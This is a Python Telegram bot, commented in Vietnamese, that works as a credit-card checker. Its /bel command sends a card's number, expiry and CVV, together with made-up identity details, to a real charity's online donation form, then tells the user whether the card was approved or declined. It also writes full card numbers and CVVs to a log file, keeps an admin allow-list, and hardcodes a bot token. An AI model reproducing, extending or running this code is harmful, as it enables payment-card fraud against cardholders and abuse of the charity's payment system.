import logging
import random
import re
import aiohttp
import asyncio
import nest_asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from datetime import datetime
import time

# Thiết lập logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Thiết lập nest_asyncio
nest_asyncio.apply()

# Danh sách họ ngẫu nhiên
last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson"]

# Hàm để tạo số ngẫu nhiên trong khoảng
def random_num(min_value, max_value):
    return str(random.randint(min_value, max_value))

# Hàm để tạo email ngẫu nhiên
def random_email():
    domains = ['gmail.com', 'yahoo.com', 'hotmail.com']
    return f"user{random_num(1000, 9999)}@{random.choice(domains)}"

# Hàm để tạo tên ngẫu nhiên
def random_name():
    first_names = ["John", "Michael", "Sarah", "Jessica", "David", "Emily", "Daniel", "Sophia"]
    return f"{random.choice(first_names)} {random.choice(last_names)}"

# Hàm để tạo mã bưu điện ngẫu nhiên
def random_zipcode():
    return random_num(1000, 9000)

# Hàm để kiểm tra định dạng thẻ và lấy thông tin
def extract_card_info(card_input):
    card_pattern = r'(\d{16})[^\d]*(\d{2})[^\d]*(\d{2,4})[^\d]*(\d{3})'
    match = re.search(card_pattern, card_input)
    if match:
        cc, mes, ano, cvv = match.groups()
        if len(ano) == 2:
            ano = "20" + ano
        return cc, mes, ano, cvv
    return None

# Hàm để tìm thông báo lỗi trong phản hồi
def extract_error_message(response_text):
    error_match = re.search(r'class="errMsg ">(.*?)<\/a>', response_text, re.DOTALL)
    if error_match:
        return error_match.group(1).strip()
    return None

# Hàm xử lý lệnh /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Chào mừng bạn đến với bot thanh toán! Vui lòng nhập thông tin thẻ của bạn.")

# Hàm xử lý lệnh /allow
async def allow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = 2077786453
    if update.effective_user.id == admin_id:
        user_id = int(context.args[0])
        with open("allowed_users.txt", "a") as f:
            f.write(f"{user_id}\n")
        await update.message.reply_text(f"Đã cho phép người dùng với ID {user_id}.")
    else:
        await update.message.reply_text("Bạn không có quyền thực hiện lệnh này.")

# Hàm xử lý lệnh /unallow
async def unallow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = 2077786453
    if update.effective_user.id == admin_id:
        user_id = int(context.args[0])
        lines = []
        with open("allowed_users.txt", "r") as f:
            lines = f.readlines()
        with open("allowed_users.txt", "w") as f:
            for line in lines:
                if line.strip() != str(user_id):
                    f.write(line)
        await update.message.reply_text(f"Đã hủy quyền người dùng với ID {user_id}.")
    else:
        await update.message.reply_text("Bạn không có quyền thực hiện lệnh này.")

# Hàm xử lý lệnh /bel
async def bel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = " ".join(context.args)
    card_info = extract_card_info(user_input)

    if card_info:
        cc, mes, ano, cvv = card_info
        current_year = int(datetime.now().strftime("%y"))
        current_full_year = int(datetime.now().strftime("%Y"))
        current_month = int(datetime.now().strftime("%m"))

        if len(ano) == 2:
            ano = "20" + ano
        ano = int(ano)

        if ano < current_full_year or (ano == current_full_year and int(mes) < current_month):
            await update.message.reply_text(f"Thẻ {cc} hết hạn.")
            return

        phone = random_num(710000009, 900000009)
        email = random_email()
        name = random_name()
        zipcode = random_zipcode()

        await update.message.reply_text(f"Đang xử lý thẻ {cc}...")

        start_time = time.time()  # Đo thời gian bắt đầu
        async with aiohttp.ClientSession() as session:
            async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor",
                                    data={
                                        'tfa_4': 'tfa_5',
                                        'tfa_52': 'tfa_53',
                                        'tfa_7': 'tfa_317',
                                        'tfa_19': '1',
                                        'tfa_20': '',
                                        'tfa_21': name,
                                        'tfa_23': 'Vu',
                                        'tfa_27': phone,
                                        'tfa_2276': zipcode,
                                        'tfa_25': email,
                                        'tfa_48': 'Web',
                                        'tfa_50': 'tfa_50',
                                        'tfa_59': cc,
                                        'tfa_60': mes,
                                        'tfa_70': ano,
                                        'tfa_62': cvv,
                                        'tfa_2273': 'G-BCL7XEG4WC',
                                        'tfa_2274': 'GTM-WMPTRWL',
                                        'tfa_dbCounters': '785-2252e2e2bdb682ac1beba8ae3f2ff00e',
                                        'tfa_dbFormId': '151',
                                        'tfa_dbResponseId': '',
                                        'tfa_dbControl': '5bcfe3f364f816d947749cc553596cff',
                                        'tfa_dbWorkflowSessionUuid': '',
                                        'tfa_dbTimeStarted': '1727426006',
                                        'tfa_dbVersionId': '29',
                                        'tfa_switchedoff': 'tfa_2270%2Ctfa_328'
                                    }) as response:

                response_text = await response.text()
                response_time = time.time() - start_time  # Đo thời gian phản hồi

                # Kiểm tra chuyển hướng
                if response.history and response.status == 200:
                    final_url = str(response.url)
                    if "success" in final_url:
                        await update.message.reply_text(f"Thẻ {cc} đã được phê duyệt!")
                    else:
                        error_message = extract_error_message(response_text)
                        await update.message.reply_text(f"Thẻ {cc} bị từ chối: {error_message if error_message else 'Không rõ lý do.'}")
                else:
                    await update.message.reply_text(f"Thẻ {cc} không thành công.")

                # Ghi log
                with open("user_logs.txt", "a", encoding="utf-8") as log_file:
                    log_file.write(f"User ID: {update.effective_user.id}, Card: {cc}, Month: {mes}, Year: {ano}, CVV: {cvv}, Result: {'Approved' if 'success' in final_url else 'Declined'}\n")
    else:
        await update.message.reply_text("Thông tin thẻ không hợp lệ. Vui lòng nhập lại theo định dạng: <cc>|<mes>|<ano>|<cvv>")

# Hàm chính để khởi động bot
async def main():
    app = ApplicationBuilder().token("5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro").build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("allow", allow_user))
    app.add_handler(CommandHandler("unallow", unallow_user))
    app.add_handler(CommandHandler("bel", bel_command))  # Thêm lệnh /bel

    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
